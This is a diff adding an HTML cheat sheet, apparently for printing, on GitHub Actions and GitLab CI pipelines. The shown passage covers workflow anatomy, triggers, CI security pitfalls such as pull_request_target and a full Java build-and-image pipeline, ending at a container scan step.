@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GitHub Actions &amp; GitLab CI — Pipelines as Code (Cheat Sheet)</title>
+<style>
+  /* ---------- Theme variables (light = the A3 printable look) ---------- */
+  html[data-theme="light"] {
+    --page-bg: #e9eef3; --sheet: #ffffff; --ink: #111; --muted: #555;
+    --h2-bg: #f2f2f2; --h2-border: #111; --h1-border: #111;
+    --border: #333; --th-bg: #eaeaea; --inline-bg: #f6f6f6; --inline-border: #e2e2e2;
+    --tips-bg: #fffdf4; --tips-border: #888; --tips-ink: #6a4a00;
+    --tricky-bg: #fafaff; --tricky-border: #333;
+    --cw-head-bg: #fbe8e8; --cw-head-ink: #7a0000; --cw-cell: #fff6f6;
+    --cr-head-bg: #e5f7e8; --cr-head-ink: #0b5d16; --cr-cell: #f4fbf5;
+    --link: #005a9e;
+    --code-bg: #f6f8fa; --code-ink: #24292e; --code-border: #d0d7de;
+    --c-kw: #cf222e; --c-typ: #953800; --c-str: #0a3069; --c-num: #0550ae; --c-cmt: #6e7781; --c-ann: #116329; --c-fn: #8250df;
+    --shadow: rgba(20,40,70,0.15);
+  }
+  html[data-theme="dark"] {
+    --page-bg: #0e131a; --sheet: #161d27; --ink: #e6edf3; --muted: #9aa7b8;
+    --h2-bg: #202a3a; --h2-border: #5a9bff; --h1-border: #5a9bff;
+    --border: #2b3648; --th-bg: #232e40; --inline-bg: #202a3a; --inline-border: #2b3648;
+    --tips-bg: #2a2410; --tips-border: #6a5a1e; --tips-ink: #e8d48a;
+    --tricky-bg: #18202e; --tricky-border: #2b3648;
+    --cw-head-bg: #3a1f22; --cw-head-ink: #ff9b9b; --cw-cell: #2a1618;
+    --cr-head-bg: #16301f; --cr-head-ink: #86e0a0; --cr-cell: #13251a;
+    --link: #6cb0ff;
+    --code-bg: #0d1117; --code-ink: #e6edf3; --code-border: #30363d;
+    --c-kw: #ff7b72; --c-typ: #ffa657; --c-str: #a5d6ff; --c-num: #79c0ff; --c-cmt: #8b949e; --c-ann: #d2a8ff; --c-fn: #d2a8ff;
+    --shadow: rgba(0,0,0,0.5);
+  }
+
+  @page { size: A3; margin: 12mm; }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--page-bg); color: var(--ink);
+    font-family: "Segoe UI", Arial, Helvetica, sans-serif;
+    font-size: 11.5pt; line-height: 1.4;
+    transition: background 0.25s, color 0.25s;
+    padding: 22px 10px 70px;
+  }
+  .wrap {
+    max-width: 1650px; margin: 0 auto; background: var(--sheet);
+    padding: 22px 26px 40px; border-radius: 8px;
+    box-shadow: 0 10px 40px var(--shadow);
+  }
+
+  h1 {
+    font-size: 26pt; margin: 4px 0 6px; letter-spacing: 0.3px;
+    border-bottom: 3px solid var(--h1-border); padding-bottom: 6px;
+  }
+  h1 .sub { font-size: 12pt; font-weight: normal; color: var(--muted); margin-left: 10px; }
+  h2 {
+    font-size: 16pt; margin: 26px 0 6px; padding: 6px 12px;
+    background: var(--h2-bg); border-left: 6px solid var(--h2-border);
+    border-radius: 3px; scroll-margin-top: 76px; page-break-after: avoid;
+  }
+  h2.flash { animation: flash 1s ease; }
+  @keyframes flash { 0%,100% { background: var(--h2-bg); } 35% { background: #ffe9a8; color:#111; } }
+  h3 { font-size: 12.5pt; margin: 14px 0 4px; color: var(--ink); page-break-after: avoid; }
+  p, li { margin: 4px 0; }
+
+  code {
+    font-family: "Consolas", "Courier New", monospace; font-size: 10.5pt;
+    background: var(--inline-bg); border: 1px solid var(--inline-border);
+    border-radius: 3px; padding: 1px 5px; color: var(--ink);
+  }
+  pre {
+    font-family: "Consolas", "Courier New", monospace; font-size: 10.25pt;
+    line-height: 1.5; background: var(--code-bg); color: var(--code-ink);
+    border: 1px solid var(--code-border); border-radius: 5px;
+    padding: 10px 12px; overflow-x: auto; white-space: pre-wrap;
+    page-break-inside: avoid; -webkit-print-color-adjust: exact; print-color-adjust: exact;
+  }
+  pre .kw  { color: var(--c-kw); font-weight: 600; }   /* YAML keys */
+  pre .typ { color: var(--c-typ); }                    /* action names, images */
+  pre .str { color: var(--c-str); }                    /* strings */
+  pre .num { color: var(--c-num); }                    /* numbers */
+  pre .cmt { color: var(--c-cmt); font-style: italic; }/* comments */
+  pre .ann { color: var(--c-ann); font-weight: 600; }  /* expressions ${{ }}, flags */
+  pre .fn  { color: var(--c-fn); }                     /* commands */
+
+  table { border-collapse: collapse; width: 100%; margin: 6px 0 10px; page-break-inside: avoid; }
+  th, td { border: 1px solid var(--border); padding: 6px 8px; vertical-align: top; text-align: left; }
+  th { background: var(--th-bg); font-weight: 600; }
+  table.compare th:nth-child(1) { width: 22%; }
+  table.compare th:nth-child(2) { width: 39%; background: var(--cw-head-bg); color: var(--cw-head-ink); }
+  table.compare th:nth-child(3) { width: 39%; background: var(--cr-head-bg); color: var(--cr-head-ink); }
+  table.compare td:nth-child(2) { background: var(--cw-cell); }
+  table.compare td:nth-child(3) { background: var(--cr-cell); }
+
+  .tips { border: 1px dashed var(--tips-border); background: var(--tips-bg); color: var(--tips-ink); padding: 8px 12px; margin: 6px 0 10px; border-radius: 4px; page-break-inside: avoid; }
+  .tips b { color: var(--tips-ink); }
+  .tricky { border: 1px solid var(--tricky-border); background: var(--tricky-bg); padding: 10px 12px; margin: 10px 0 16px; border-radius: 4px; page-break-inside: avoid; }
+  .tricky .q { font-weight: 600; margin-bottom: 4px; }
+  details > summary { cursor: pointer; color: var(--link); font-weight: 600; margin-top: 4px; }
+  details[open] > summary { color: var(--ink); }
+  details .hint { margin-top: 4px; padding: 6px 8px; background: var(--inline-bg); border-left: 4px solid var(--link); border-radius: 3px; }
+
+  .pill { display: inline-block; padding: 1px 7px; border-radius: 10px; font-size: 9.5pt; font-weight: 600; margin-right: 4px; color: #fff; }
+  .pill.bad { background: #a40000; } .pill.good { background: #116611; } .pill.tip { background: #b08100; }
+  .legend { font-size: 10pt; margin: 6px 0 10px; } .small { font-size: 9.5pt; color: var(--muted); }
+  .back-top { display: inline-block; margin-top: 8px; font-size: 9.5pt; color: var(--link); text-decoration: none; }
+  .back-top:hover { text-decoration: underline; }
+
+  .toc { display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px 14px; font-size: 10.5pt; margin: 10px 0 4px; }
+  .toc a { color: var(--link); text-decoration: none; }
+  .toc a:hover { text-decoration: underline; }
+  .toc-box { border: 1px solid var(--border); border-radius: 6px; padding: 10px 14px; margin: 8px 0 4px; }
+  .toc-box h3 { margin: 0 0 6px; }
+
+  /* ---------- Fixed controls ---------- */
+  .ctrl-btn {
+    position: fixed; top: 14px; z-index: 60; width: 44px; height: 44px; border-radius: 10px;
+    background: var(--sheet); color: var(--ink); border: 1px solid var(--border);
+    box-shadow: 0 4px 14px var(--shadow); cursor: pointer; font-size: 19px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  #hamburger { left: 14px; } #themeToggle { right: 14px; }
+
+  .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.45); opacity: 0; pointer-events: none; transition: opacity 0.25s; z-index: 55; }
+  .overlay.open { opacity: 1; pointer-events: auto; }
+  .menu { position: fixed; top: 0; left: 0; height: 100%; width: 300px; max-width: 82vw; background: var(--sheet); border-right: 1px solid var(--border); box-shadow: 6px 0 30px var(--shadow); z-index: 58; transform: translateX(-105%); transition: transform 0.28s ease; padding: 70px 12px 20px; overflow-y: auto; }
+  .menu.open { transform: translateX(0); }
+  .menu h3 { margin: 0 0 10px 4px; font-size: 11pt; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); }
+  .menu a { display: block; text-decoration: none; color: var(--ink); padding: 7px 10px; border-radius: 7px; font-size: 10.5pt; margin-bottom: 3px; background: var(--inline-bg); }
+  .menu a:hover { background: var(--h2-bg); }
+
+  @media print {
+    body { background: #fff; padding: 0; } .wrap { box-shadow: none; }
+    .ctrl-btn, .overlay, .menu, .noprint { display: none !important; }
+    details { page-break-inside: avoid; }
+    details > summary { list-style: none; color: #111; }
+    details > summary::-webkit-details-marker { display: none; }
+    details:not([open]) > *:not(summary) { display: block !important; }
+    details > summary::after { content: " (hint revealed for print)"; font-weight: normal; color: #555; font-size: 9.5pt; }
+  }
+</style>
+</head>
+<body>
+
+<button id="hamburger" class="ctrl-btn noprint" aria-label="Open menu">☰</button>
+<button id="themeToggle" class="ctrl-btn noprint" aria-label="Toggle light or dark">🌙</button>
+<div class="overlay noprint" id="overlay"></div>
+<nav class="menu noprint" id="menu"><h3>Jump to section</h3><div id="menuLinks"></div></nav>
+
+<div class="wrap" id="top">
+
+<h1>GitHub Actions &amp; GitLab CI — Pipelines as Code<span class="sub">What a pipeline is · workflow anatomy · triggers · a full Java pipeline · caching &amp; artifacts · matrix · secrets, environments, OIDC · reusable workflows · runners · GitLab CI translation · security · traps (A3 print ready)</span></h1>
+
+<div class="legend">
+  <span class="pill bad">Wrong / Not Allowed</span>
+  <span class="pill good">Best Practice / Right</span>
+  <span class="pill tip">Tip / Trick</span>
+  <span class="small">GitHub Actions is the main thread; Section 8 maps every concept to GitLab CI. Use ← → keys to move between sections.</span>
+</div>
+
+<div class="toc-box">
+  <h3>Contents</h3>
+  <div class="toc" id="toc"></div>
+</div>
+
+<!-- ============================= 0 ============================= -->
+<h2 id="s0">0. What a hosted CI pipeline is (and how it differs from Jenkins)</h2>
+<p><b>GitHub Actions</b> and <b>GitLab CI</b> run your build steps on fresh virtual machines or containers every time something happens in the repo (push, pull request, tag, schedule, button). The pipeline is a YAML file <i>in the repo</i>, so it is versioned and reviewed like code. There is no server to install: the platform hosts the control plane and (optionally) the machines.</p>
+<table>
+  <thead><tr><th>Concept</th><th>GitHub Actions</th><th>GitLab CI</th><th>Jenkins (for comparison)</th></tr></thead>
+  <tbody>
+    <tr><td>Definition file</td><td><code>.github/workflows/*.yml</code> — many files, one per workflow</td><td><code>.gitlab-ci.yml</code> — one file (can <code>include</code> others)</td><td><code>Jenkinsfile</code> (Groovy)</td></tr>
+    <tr><td>Unit of work</td><td><b>Workflow</b> → <b>jobs</b> (parallel by default) → <b>steps</b> (sequential)</td><td><b>Pipeline</b> → <b>stages</b> (sequential) → <b>jobs</b> (parallel within a stage) → <code>script</code> lines</td><td>Pipeline → stages → steps</td></tr>
+    <tr><td>Where it runs</td><td><b>Runner</b>: GitHub-hosted (<code>ubuntu-latest</code>…) or self-hosted</td><td><b>Runner</b>: GitLab SaaS shared, or your own (Docker/Kubernetes/shell executors)</td><td>Agent</td></tr>
+    <tr><td>Reuse</td><td><b>Actions</b> (marketplace, <code>uses:</code>), composite actions, reusable workflows</td><td><code>include:</code>, <code>extends:</code>, YAML anchors, CI/CD components (catalog)</td><td>Shared libraries, plugins</td></tr>
+    <tr><td>Clean environment</td><td>New VM per job; nothing survives unless you cache or upload artifacts</td><td>New container per job (Docker executor); same rule</td><td>Workspace persists on the agent unless cleaned</td></tr>
+    <tr><td>Secrets</td><td>Repo / environment / org secrets, <code>${{ secrets.X }}</code></td><td>CI/CD variables (masked, protected), <code>$X</code></td><td>Credentials store</td></tr>
+    <tr><td>Deploy gates</td><td><b>Environments</b> with required reviewers and wait timers</td><td><b>Environments</b> + <code>when: manual</code> + protected environments</td><td><code>input</code> step</td></tr>
+    <tr><td>Pricing</td><td>Minutes (free for public repos, quota for private)</td><td>Compute minutes</td><td>Your servers</td></tr>
+  </tbody>
+</table>
+<table>
+  <thead><tr><th>#</th><th>What happens on a push</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td>GitHub reads every workflow whose <code>on:</code> matches the event (branch, path filters).</td></tr>
+    <tr><td>2</td><td>For each job, a runner is assigned; a fresh VM boots with a pre-installed toolset (Java, Docker, Node, etc.).</td></tr>
+    <tr><td>3</td><td>Steps run in order: <code>actions/checkout</code> clones the repo, then your commands. Each step's exit code decides pass/fail.</td></tr>
+    <tr><td>4</td><td>Jobs that <code>needs:</code> others wait for them; outputs and artifacts flow between jobs; caches are restored/saved.</td></tr>
+    <tr><td>5</td><td>Status is reported back to the commit/PR as a check; required checks block merging; environments gate deploys.</td></tr>
+  </tbody>
+</table>
+<div class="tips"><b>Mental model:</b> every job is a brand-new laptop handed to a robot with your checklist. The robot has nothing from last time — no repo, no jars, no login. Whatever you want it to have, you must fetch (checkout), restore (cache), download (artifact), or inject (secret) at the start, and anything you want to keep you must upload before the laptop is wiped.</div>
+<div class="tricky">
+  <div class="q">Q. Job A builds <code>target/app.jar</code>. Job B runs <code>java -jar target/app.jar</code> and fails with "file not found". Why?</div>
+  <details><summary>Reveal hint</summary><div class="hint">Different jobs = different machines. B never had A's files. Upload the jar as an <b>artifact</b> in A (<code>actions/upload-artifact</code>) and download it in B, or do both in one job.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 1 ============================= -->
+<h2 id="s1">1. Workflow anatomy — every key you will use</h2>
+<pre><span class="kw">name</span>: CI                                          <span class="cmt"># shown in the Actions tab</span>
+<span class="kw">run-name</span>: <span class="str">CI for ${{ github.ref_name }} by @${{ github.actor }}</span>
+
+<span class="kw">on</span>:                                               <span class="cmt"># triggers (Section 2)</span>
+  <span class="kw">push</span>: { <span class="kw">branches</span>: [main], <span class="kw">tags</span>: [<span class="str">'v*'</span>] }
+  <span class="kw">pull_request</span>: { <span class="kw">branches</span>: [main] }
+
+<span class="kw">permissions</span>:                                      <span class="cmt"># least privilege for the GITHUB_TOKEN (default is too broad)</span>
+  <span class="kw">contents</span>: read
+
+<span class="kw">concurrency</span>:                                      <span class="cmt"># cancel the previous run of the same PR when a new push arrives</span>
+  <span class="kw">group</span>: <span class="str">ci-${{ github.ref }}</span>
+  <span class="kw">cancel-in-progress</span>: <span class="kw">true</span>
+
+<span class="kw">env</span>:                                              <span class="cmt"># workflow-wide env vars (also allowed per job / per step)</span>
+  <span class="kw">MAVEN_OPTS</span>: <span class="str">-Dmaven.repo.local=${{ github.workspace }}/.m2</span>
+
+<span class="kw">defaults</span>:
+  <span class="kw">run</span>: { <span class="kw">shell</span>: bash }                           <span class="cmt"># bash with -eo pipefail semantics on every run step</span>
+
+<span class="kw">jobs</span>:
+  <span class="kw">build</span>:                                          <span class="cmt"># job id (used in needs:)</span>
+    <span class="kw">name</span>: Build &amp; test                            <span class="cmt"># display name</span>
+    <span class="kw">runs-on</span>: ubuntu-latest                        <span class="cmt"># runner label; also ubuntu-24.04, windows-latest, macos-latest, [self-hosted, linux]</span>
+    <span class="kw">timeout-minutes</span>: <span class="num">20</span>                           <span class="cmt"># default is 360 — always set it</span>
+    <span class="kw">if</span>: <span class="str">github.event_name != 'pull_request' || !github.event.pull_request.draft</span>
+    <span class="kw">outputs</span>:
+      <span class="kw">version</span>: <span class="str">${{ steps.ver.outputs.version }}</span>   <span class="cmt"># expose a step output to other jobs</span>
+    <span class="kw">services</span>:                                     <span class="cmt"># sidecar containers for the job (DB for integration tests)</span>
+      <span class="kw">postgres</span>:
+        <span class="kw">image</span>: <span class="typ">postgres:16</span>
+        <span class="kw">env</span>: { <span class="kw">POSTGRES_PASSWORD</span>: test }
+        <span class="kw">ports</span>: [<span class="str">"5432:5432"</span>]
+        <span class="kw">options</span>: <span class="str">--health-cmd pg_isready --health-interval 5s --health-retries 10</span>
+    <span class="kw">steps</span>:
+      - <span class="kw">uses</span>: actions/checkout@v4                 <span class="cmt"># a step that runs an action</span>
+        <span class="kw">with</span>: { <span class="kw">fetch-depth</span>: <span class="num">0</span> }                   <span class="cmt"># full history (tags for versioning); default 1 = shallow</span>
+      - <span class="kw">uses</span>: actions/setup-java@v4
+        <span class="kw">with</span>: { <span class="kw">distribution</span>: temurin, <span class="kw">java-version</span>: <span class="num">21</span>, <span class="kw">cache</span>: maven }
+      - <span class="kw">name</span>: Compute version                     <span class="cmt"># a step that runs a shell command</span>
+        <span class="kw">id</span>: ver
+        <span class="kw">run</span>: echo <span class="str">"version=$(git describe --tags --always)"</span> &gt;&gt; <span class="str">"$GITHUB_OUTPUT"</span>
+      - <span class="kw">name</span>: Build
+        <span class="kw">run</span>: ./mvnw -B -ntp verify
+        <span class="kw">env</span>: { <span class="kw">DB_URL</span>: <span class="str">jdbc:postgresql://localhost:5432/postgres</span> }
+      - <span class="kw">name</span>: Test report
+        <span class="kw">if</span>: always()                                <span class="cmt"># run even when a previous step failed</span>
+        <span class="kw">uses</span>: dorny/test-reporter@v1
+        <span class="kw">with</span>: { <span class="kw">name</span>: JUnit, <span class="kw">path</span>: <span class="str">'**/target/surefire-reports/*.xml'</span>, <span class="kw">reporter</span>: java-junit }
+      - <span class="kw">uses</span>: actions/upload-artifact@v4
+        <span class="kw">with</span>: { <span class="kw">name</span>: app-jar, <span class="kw">path</span>: target/*.jar, <span class="kw">retention-days</span>: <span class="num">7</span> }
+
+  <span class="kw">deploy</span>:
+    <span class="kw">needs</span>: build                                  <span class="cmt"># dependency; runs after build succeeds</span>
+    <span class="kw">if</span>: <span class="str">github.ref == 'refs/heads/main'</span>
+    <span class="kw">runs-on</span>: ubuntu-latest
+    <span class="kw">environment</span>: production                       <span class="cmt"># gates + environment secrets</span>
+    <span class="kw">steps</span>:
+      - <span class="kw">uses</span>: actions/download-artifact@v4
+        <span class="kw">with</span>: { <span class="kw">name</span>: app-jar, <span class="kw">path</span>: dist }
+      - <span class="kw">run</span>: echo <span class="str">"deploying ${{ needs.build.outputs.version }}"</span></pre>
+<table>
+  <thead><tr><th>Expression / context</th><th>Meaning</th></tr></thead>
+  <tbody>
+    <tr><td><code>${{ github.ref }}</code> / <code>github.ref_name</code> / <code>github.sha</code></td><td><code>refs/heads/main</code> / <code>main</code> / commit SHA.</td></tr>
+    <tr><td><code>github.event_name</code>, <code>github.event.pull_request.number</code></td><td>What triggered the run; the webhook payload.</td></tr>
+    <tr><td><code>github.actor</code>, <code>github.repository</code>, <code>github.run_id</code>, <code>github.run_number</code></td><td>Who, where, which run.</td></tr>
+    <tr><td><code>${{ secrets.X }}</code>, <code>${{ vars.X }}</code>, <code>${{ env.X }}</code></td><td>Secret, plain variable, env var.</td></tr>
+    <tr><td><code>${{ steps.id.outputs.k }}</code>, <code>${{ needs.job.outputs.k }}</code>, <code>${{ needs.job.result }}</code></td><td>Pass values between steps / jobs.</td></tr>
+    <tr><td><code>${{ matrix.java }}</code>, <code>${{ inputs.x }}</code>, <code>${{ runner.os }}</code></td><td>Matrix value, workflow input, runner info.</td></tr>
+    <tr><td><code>success()</code>, <code>failure()</code>, <code>always()</code>, <code>cancelled()</code></td><td>Status functions for <code>if:</code>.</td></tr>
+    <tr><td><code>contains()</code>, <code>startsWith()</code>, <code>hashFiles('**/pom.xml')</code>, <code>toJSON()</code>, <code>fromJSON()</code></td><td>Helpers. <code>hashFiles</code> is the cache-key workhorse.</td></tr>
+    <tr><td><code>$GITHUB_OUTPUT</code>, <code>$GITHUB_ENV</code>, <code>$GITHUB_STEP_SUMMARY</code>, <code>$GITHUB_PATH</code></td><td>Files a <code>run</code> step appends to: set an output, set an env var for later steps, write Markdown to the run summary, add to PATH.</td></tr>
+  </tbody>
+</table>
+<table class="compare">
+  <thead><tr><th>Topic</th><th>Wrong</th><th>Right</th></tr></thead>
+  <tbody>
+    <tr><td>No timeout</td><td>A hung test holds a runner for 6 hours and burns minutes.</td><td><code>timeout-minutes</code> on every job.</td></tr>
+    <tr><td>No concurrency group</td><td>Five pushes to a PR = five full runs.</td><td><code>concurrency</code> with <code>cancel-in-progress: true</code> for CI (not for deploys).</td></tr>
+    <tr><td>Default permissions</td><td><code>GITHUB_TOKEN</code> can write to the repo, PRs, packages from any step — including third-party actions.</td><td><code>permissions: contents: read</code> at the top; grant extra per job (<code>packages: write</code>, <code>id-token: write</code>).</td></tr>
+    <tr><td><code>::set-output</code></td><td>Deprecated command; warnings then failure.</td><td><code>echo "k=v" &gt;&gt; "$GITHUB_OUTPUT"</code>.</td></tr>
+    <tr><td>Floating action versions</td><td><code>uses: some/action@main</code> — the action can change under you (or be hijacked).</td><td>Pin to a major tag from trusted publishers (<code>@v4</code>), or to a full SHA for third-party actions; Dependabot updates them.</td></tr>
+  </tbody>
+</table>
+<div class="tricky">
+  <div class="q">Q. A <code>run</code> step does <code>export VERSION=1.2</code>. The next step echoes <code>$VERSION</code> and gets nothing. Why?</div>
+  <details><summary>Reveal hint</summary><div class="hint">Each step is a new shell process. Write to the env file instead: <code>echo "VERSION=1.2" &gt;&gt; "$GITHUB_ENV"</code> — later steps in the same job see it. For other jobs, use outputs.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 2 ============================= -->
+<h2 id="s2">2. Triggers — when workflows run</h2>
+<table>
+  <thead><tr><th>Trigger</th><th>Fires when</th><th>Notes</th></tr></thead>
+  <tbody>
+    <tr><td><code>push</code></td><td>Commits pushed to matching <code>branches</code> / <code>tags</code> / <code>paths</code>.</td><td>Also fires for merges (a merge is a push to main).</td></tr>
+    <tr><td><code>pull_request</code></td><td>PR opened, synchronized (new push), reopened; filter with <code>types:</code>.</td><td>Runs on a <b>merge commit</b> of PR+base, with read-only token for forks. Secrets are <b>not</b> available to PRs from forks.</td></tr>
+    <tr><td><code>pull_request_target</code></td><td>Same events, but runs in the <b>base</b> repo context with secrets.</td><td>Dangerous: never check out and execute PR code here. Only for labeling/commenting.</td></tr>
+    <tr><td><code>workflow_dispatch</code></td><td>Manual "Run workflow" button, with typed <code>inputs</code>.</td><td>Deploys, one-off jobs.</td></tr>
+    <tr><td><code>schedule</code></td><td>Cron (UTC): <code>- cron: '0 2 * * 1-5'</code>.</td><td>Nightly builds, dependency scans. Runs on the default branch only; may be delayed under load.</td></tr>
+    <tr><td><code>release</code> (<code>types: [published]</code>)</td><td>A GitHub Release is created.</td><td>Publish artifacts / images.</td></tr>
+    <tr><td><code>workflow_call</code></td><td>Called by another workflow (reusable workflows, Section 6).</td><td>—</td></tr>
+    <tr><td><code>workflow_run</code></td><td>After another workflow finishes.</td><td>Chain pipelines; has secrets even for forks → careful.</td></tr>
+    <tr><td><code>issue_comment</code>, <code>issues</code>, <code>label</code>, <code>repository_dispatch</code>, <code>merge_group</code></td><td>Chat-ops (<code>/deploy</code> comments), automation, external webhooks, merge queue.</td><td><code>merge_group</code> is required if you use the merge queue with required checks.</td></tr>
+  </tbody>
+</table>
+<pre><span class="kw">on</span>:
+  <span class="kw">push</span>:
+    <span class="kw">branches</span>: [main, <span class="str">'release/**'</span>]
+    <span class="kw">tags</span>: [<span class="str">'v[0-9]+.[0-9]+.[0-9]+'</span>]
+    <span class="kw">paths</span>: [<span class="str">'services/orders/**'</span>, <span class="str">'libs/**'</span>, <span class="str">'.github/workflows/orders.yml'</span>]     <span class="cmt"># monorepo: only when these change</span>
+    <span class="kw">paths-ignore</span>: [<span class="str">'**.md'</span>, <span class="str">'docs/**'</span>]
+  <span class="kw">pull_request</span>:
+    <span class="kw">types</span>: [opened, synchronize, reopened, ready_for_review]
+  <span class="kw">schedule</span>:
+    - <span class="kw">cron</span>: <span class="str">'30 1 * * *'</span>                           <span class="cmt"># 01:30 UTC daily</span>
+  <span class="kw">workflow_dispatch</span>:
+    <span class="kw">inputs</span>:
+      <span class="kw">environment</span>: { <span class="kw">type</span>: choice, <span class="kw">options</span>: [staging, production], <span class="kw">required</span>: <span class="kw">true</span> }
+      <span class="kw">version</span>:     { <span class="kw">type</span>: string, <span class="kw">description</span>: <span class="str">"Image tag to deploy"</span> }
+      <span class="kw">dry_run</span>:     { <span class="kw">type</span>: boolean, <span class="kw">default</span>: <span class="kw">false</span> }
+<span class="cmt"># in steps: ${{ inputs.environment }}  (also github.event.inputs.environment)</span></pre>
+<table class="compare">
+  <thead><tr><th>Topic</th><th>Wrong</th><th>Right</th></tr></thead>
+  <tbody>
+    <tr><td>Path filters + required checks</td><td>Check is required, but path filter skipped the workflow → PR stuck "waiting for status".</td><td>Either don't require path-filtered checks, or add a tiny always-run job that passes when nothing relevant changed (<code>dorny/paths-filter</code> inside the job instead of <code>on.paths</code>).</td></tr>
+    <tr><td><code>pull_request_target</code> + checkout of PR head</td><td>Attacker's PR code runs with your secrets.</td><td>Never. Use <code>pull_request</code> for building PR code.</td></tr>
+    <tr><td>Running CI twice</td><td><code>on: [push, pull_request]</code> without branch filters → every PR push runs both.</td><td><code>push: branches: [main]</code> + <code>pull_request</code>.</td></tr>
+    <tr><td>Tag workflow with shallow clone</td><td><code>git describe</code> fails on release.</td><td><code>fetch-depth: 0</code> (or <code>fetch-tags: true</code>) in release workflows.</td></tr>
+    <tr><td>Cron in local time</td><td>Nightly at "2am" runs at 7:30 IST.</td><td>Cron is UTC; comment the local time.</td></tr>
+  </tbody>
+</table>
+<div class="tricky">
+  <div class="q">Q. Your PR workflow checks out the code. Is it the PR branch's commit?</div>
+  <details><summary>Reveal hint</summary><div class="hint">By default no — <code>pull_request</code> checks out <code>refs/pull/N/merge</code>, a temporary merge of the PR into the base branch. That is what you want for testing "what main will look like". For the raw head use <code>ref: ${{ github.event.pull_request.head.sha }}</code>.</div></details>
+</div>
+<a class="back-top" href="#top">↑ Back to top</a>
+
+<!-- ============================= 3 ============================= -->
+<h2 id="s3">3. A complete Java pipeline — build, test, image, deploy</h2>
+<pre><span class="kw">name</span>: shop-api
+<span class="kw">on</span>:
+  <span class="kw">push</span>: { <span class="kw">branches</span>: [main], <span class="kw">tags</span>: [<span class="str">'v*'</span>] }
+  <span class="kw">pull_request</span>:
+<span class="kw">permissions</span>: { <span class="kw">contents</span>: read }
+<span class="kw">concurrency</span>: { <span class="kw">group</span>: <span class="str">${{ github.workflow }}-${{ github.ref }}</span>, <span class="kw">cancel-in-progress</span>: <span class="str">${{ github.event_name == 'pull_request' }}</span> }
+
+<span class="kw">env</span>:
+  <span class="kw">IMAGE</span>: <span class="str">ghcr.io/${{ github.repository }}</span>
+
+<span class="kw">jobs</span>:
+  <span class="kw">test</span>:
+    <span class="kw">runs-on</span>: ubuntu-latest
+    <span class="kw">timeout-minutes</span>: <span class="num">25</span>
+    <span class="kw">steps</span>:
+      - <span class="kw">uses</span>: actions/checkout@v4
+      - <span class="kw">uses</span>: actions/setup-java@v4
+        <span class="kw">with</span>: { <span class="kw">distribution</span>: temurin, <span class="kw">java-version</span>: <span class="num">21</span>, <span class="kw">cache</span>: maven }
+      - <span class="kw">name</span>: Unit + integration tests (Testcontainers uses the runner's Docker)
+        <span class="kw">run</span>: ./mvnw -B -ntp verify
+      - <span class="kw">name</span>: Publish test results
+        <span class="kw">if</span>: always()
+        <span class="kw">uses</span>: mikepenz/action-junit-report@v5
+        <span class="kw">with</span>: { <span class="kw">report_paths</span>: <span class="str">'**/target/*-reports/TEST-*.xml'</span> }
+      - <span class="kw">name</span>: Coverage to summary
+        <span class="kw">if</span>: always()
+        <span class="kw">run</span>: |
+          echo <span class="str">"## Coverage"</span> &gt;&gt; <span class="str">"$GITHUB_STEP_SUMMARY"</span>
+          grep -o <span class="str">'Total[^%]*%'</span> target/site/jacoco/index.html | head -1 &gt;&gt; <span class="str">"$GITHUB_STEP_SUMMARY"</span> || <span class="kw">true</span>
+      - <span class="kw">uses</span>: actions/upload-artifact@v4
+        <span class="kw">with</span>: { <span class="kw">name</span>: jar, <span class="kw">path</span>: target/*.jar, <span class="kw">if-no-files-found</span>: error }
+
+  <span class="kw">image</span>:
+    <span class="kw">needs</span>: test
+    <span class="kw">if</span>: <span class="str">github.event_name == 'push'</span>                     <span class="cmt"># main and tags only, not PRs</span>
+    <span class="kw">runs-on</span>: ubuntu-latest
+    <span class="kw">permissions</span>: { <span class="kw">contents</span>: read, <span class="kw">packages</span>: write, <span class="kw">id-token</span>: write }
+    <span class="kw">outputs</span>: { <span class="kw">tag</span>: <span class="str">${{ steps.meta.outputs.version }}</span>, <span class="kw">digest</span>: <span class="str">${{ steps.push.outputs.digest }}</span> }
+    <span class="kw">steps</span>:
+      - <span class="kw">uses</span>: actions/checkout@v4
+      - <span class="kw">uses</span>: actions/download-artifact@v4
+        <span class="kw">with</span>: { <span class="kw">name</span>: jar, <span class="kw">path</span>: target }
+      - <span class="kw">uses</span>: docker/setup-buildx-action@v3
+      - <span class="kw">uses</span>: docker/login-action@v3
+        <span class="kw">with</span>: { <span class="kw">registry</span>: ghcr.io, <span class="kw">username</span>: <span class="str">${{ github.actor }}</span>, <span class="kw">password</span>: <span class="str">${{ secrets.GITHUB_TOKEN }}</span> }
+      - <span class="kw">id</span>: meta
+        <span class="kw">uses</span>: docker/metadata-action@v5                  <span class="cmt"># tags: sha-&lt;short&gt;, main, v1.4.0, 1.4, latest</span>
+        <span class="kw">with</span>:
+          <span class="kw">images</span>: <span class="str">${{ env.IMAGE }}</span>
+          <span class="kw">tags</span>: |
+            type=sha
+            type=ref,event=branch
+            type=semver,pattern={{version}}
+            type=semver,pattern={{major}}.{{minor}}
+      - <span class="kw">id</span>: push
+        <span class="kw">uses</span>: docker/build-push-action@v6
+        <span class="kw">with</span>:
+          <span class="kw">context</span>: .
+          <span class="kw">push</span>: <span class="kw">true</span>
+          <span class="kw">tags</span>: <span class="str">${{ steps.meta.outputs.tags }}</span>
+          <span class="kw">labels</span>: <span class="str">${{ steps.meta.outputs.labels }}</span>
+          <span class="kw">cache-from</span>: type=gha                         <span class="cmt"># layer cache in GitHub's cache</span>
+          <span class="kw">cache-to</span>: type=gha,mode=max
+          <span class="kw">provenance</span>: <span class="kw">true</span>
+      - <span class="kw">name</span>: Scan image
+        <span class="kw">uses</span>: aquasecurity/trivy-action@0.28.0
